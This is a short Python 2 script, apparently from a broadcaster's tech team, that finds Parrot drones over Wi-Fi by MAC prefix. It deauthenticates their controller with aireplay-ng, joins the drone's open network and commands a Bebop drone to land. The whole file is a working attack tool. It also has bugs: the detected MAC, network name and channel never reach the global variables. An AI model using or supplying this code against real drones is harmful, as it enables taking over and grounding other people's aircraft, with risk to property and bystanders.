#!/usr/bin/env python2
# -*- coding: utf-8 -*-
##################################################
# Drone Disabler
# Alvaro Antelo & Carlos Papani
# TV GLOBO - TECNOLOGIA - DTPD
##################################################

import sys
import time
import iwlist
import subprocess
sys.path.insert(0, './katarina')
from bebop import Bebop

channel = 0
essid = ""
mac = ""
parrot_macs = ["90:03:B7", "A0:14:3D", "00:12:1C", "00:26:7E", "90:3A:E6"]

def find_macs(cells):
    for i in range(0, len(cells)):
        for j in range(0, len(parrot_macs)):
            if cells[i]['mac'][0:8] == parrot_macs[j]:
                mac = cells[i]['mac'][0:8]
                essid = cells[i]['essid']
                channel = cells[i]['channel']
                return True
    return False


while(1):
    content = iwlist.scan(interface='wlan0')
    time.sleep(5)
    cells = iwlist.parse(content)
    if find_macs(cells):
        break

# Monitor interface for mac and channel drone detection
p = subprocess.Popen(['iw', 'phy', 'phy1', 'interface',
                      'add', 'mon0', 'type', 'monitor'])
sout, serror = p.communicate()
p0 = subprocess.Popen(['iw', 'dev', 'mon0', 'set', 'channel', channel])
sout, serror = p0.communicate()

# attack drone on monitor interface
p1 = subprocess.Popen(['aireplay-ng', '-0', '3', '-a', mac, 'mon0'])
sout, serror = p1.communicate()

# Associate managed interface to drone and get IP address
p2 = subprocess.Popen(['iwconfig', 'wlan0', 'mode', 'Managed', 'essid', essid, \
                       'channel', channel])
sout, serror = p2.communicate()
p3 = subprocess.Popen(['dhclient', '-v', 'wlan0'])
sout, serror = p3.communicate()


drone = Bebop()
drone.land()
